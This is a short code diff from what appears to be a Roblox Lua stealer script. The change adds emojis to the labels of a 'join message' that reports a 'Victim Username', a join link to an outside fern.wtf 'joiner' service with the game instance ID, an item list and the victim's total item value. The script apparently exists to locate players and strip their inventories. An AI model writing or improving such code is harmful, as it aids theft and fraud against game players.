@@ -143,21 +143,21 @@ local totalRAP = 0
 local function SendJoinMessage(list, prefix)
     local fields = {
         {
-            name = "Victim Username:",
+            name = "Victim Username🤖:",
             value = plr.Name,
             inline = true
         },
         {
-            name = "Join link:",
+            name = "Join link🔗:",
             value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
         },
         {
-            name = "Item list:",
+            name = "Item list📝:",
             value = "",
             inline = false
         },
         {
-            name = "Summary:",
+            name = "Summary💰:",
             value = string.format("Total RAP: %s", formatNumber(totalRAP)),
             inline = false
         }
